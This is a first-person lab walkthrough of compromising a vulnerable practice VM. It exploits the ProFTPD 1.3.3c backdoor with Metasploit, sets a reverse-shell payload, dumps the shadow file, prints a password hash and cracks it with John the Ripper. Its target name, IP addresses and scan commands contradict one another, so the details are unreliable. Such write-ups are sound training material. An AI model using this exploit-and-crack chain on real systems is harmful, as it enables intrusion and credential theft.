
## 2. Lab Environment

The environment used for this lab was composed of:

| Component               | Description                                                                    |
| ----------------------- | ------------------------------------------------------------------------------ |
| Attacking machine       | Kali Linux                                                                     |
| Target machine          | The Planets: Mercury                                                           |
| Virtualization software | Oracle VirtualBox                                                              |
| Target IP               | `192.168.0.4`                                                                  |
| Main tools used         |  |

---

## 3. VM Setup

First, I prepared the vulnerable machine:

1. Downloaded the `basic_pentesting_1.ova` file.
2. Opened Oracle VirtualBox.
3. Imported the `basic_pentesting_1.ova` appliance.
4. Started the Mercury virtual machine.
5. Used Kali Linux as the attacking machine.

After starting the VM, I needed to identify its IP address on the network.

---

## 4. Network Discovery

To identify my network interface and IP address, I used:

```bash
ip a
```

After checking my network, I scanned the subnet using Nmap:

```bash
sudo nmap -sn 192.168.0.16/24
```

The scan found the Mercury VM:

```text
Nmap scan report for 192.168.0.5
Host is up (0.0097s latency).
MAC Address: 08:00:27:04:22:EF (Oracle VirtualBox virtual NIC)
```

The MAC address indicated that the machine was running through Oracle VirtualBox, so I identified `192.168.0.4` as the target VM.

---

## 5. Port Scanning

After finding the target IP, I scanned the relevant ports:

```bash
nmap -sC -sV -p 22,8080 192.168.0.5
```

The scan showed that the target had important service exposed:

└─$ nmap -sC -sV -p- --open 192.168.0.5 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-20 00:04 +0100
Nmap scan report for 192.168.0.5
Host is up (0.000097s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3c
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:01:90:39:2d:8f:46:fb:03:86:73:b3:3c:54:7e:54 (RSA)
|   256 f1:f3:c0:dd:ba:a4:85:f7:13:9a:da:3a:bb:4d:93:04 (ECDSA)
|_  256 12:e2:98:d2:a3:e7:36:4f:be:6b:ce:36:6b:7e:0d:9e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:04:22:EF (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


## Exploit:

1. I used searchsploit commond to search ProFTPD 1.3.3c on ExploitDB.

2.  Then I found two exploits for that. ProFTPD 1.3.3c was compromised by a backdoor

3. command: msfconsole

<img width="908" height="604" alt="image" src="https://github.com/user-attachments/assets/2d2c18cd-901a-4ecc-9abb-5d8cdf8cc1ff" />

4. So there are several exploits have to this proftpd. And I used exploit/unix/ftp/proftpd_133c_backdoor to attack the target machine.

<img width="1452" height="532" alt="image" src="https://github.com/user-attachments/assets/773e8a67-c621-4f28-836a-7b50760a7843" />



5. And now I am going to look at the options of this exploit.

Commands: 
msf > use exploit/unix/ftp/proftpd_133c_backdoor
mss > options

Appears:

Module options (exploit/unix/ftp/proftpd_133c_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basi
                                      cs/using-metasploit.html
   RPORT   21               yes       The target port (TCP)


6. now I have to specify the RHOST 
Command:set RHOST 192.168.0.5
Appears: RHOST => 192.168.0.5

7. After setting the RHOST I searched payloads

Command: show payloads

<img width="1128" height="310" alt="image" src="https://github.com/user-attachments/assets/747f2ffd-b7bd-40c6-9f4e-64ca97c2db8b" />


8. So there are various PAYLOADS and I chose cmd/unix/reverse payload to exploit this vulnerability.

Command: set PAYLOAD cmd/unix/reverse

<img width="816" height="501" alt="image" src="https://github.com/user-attachments/assets/72d50d3b-16d9-48ec-a490-86bf17c9f7b8" />

9. After the set payload, I have to specify the LHOST

Command: set LHOST [IP]

<img width="816" height="394" alt="image" src="https://github.com/user-attachments/assets/3df24708-13e5-484d-ba4a-b93e357f1f61" />

10. Right, Now I have root access to the target machine. Now I am going to find the password of marlinspike forth.

Now I opened python spawned shell

Then I am looking the shadow file 

<img width="1079" height="866" alt="image" src="https://github.com/user-attachments/assets/3bcdae73-403a-4d96-b334-c1917caa47c6" />

11. Now I copied this to a new file to crack this hash **marlinspike:$6$wQb5nV3T$xB2WO/jOkbn4t1RUILrckw69LR/0EMtUbFFCYpM3MUHVmtyYW9.ov/aszTpWhLaC2x6Fvy5tpUUxQbUhCKbl4/:17484:0:99999:7:::
**


12. And now I used John The Ripper to crack this hash

<img width="630" height="405" alt="image" src="https://github.com/user-attachments/assets/2d3dea3d-7a41-4354-9712-c50fe553aa58" />

13. Finally, I found the password for the marlinspike and it is marlinspike




   

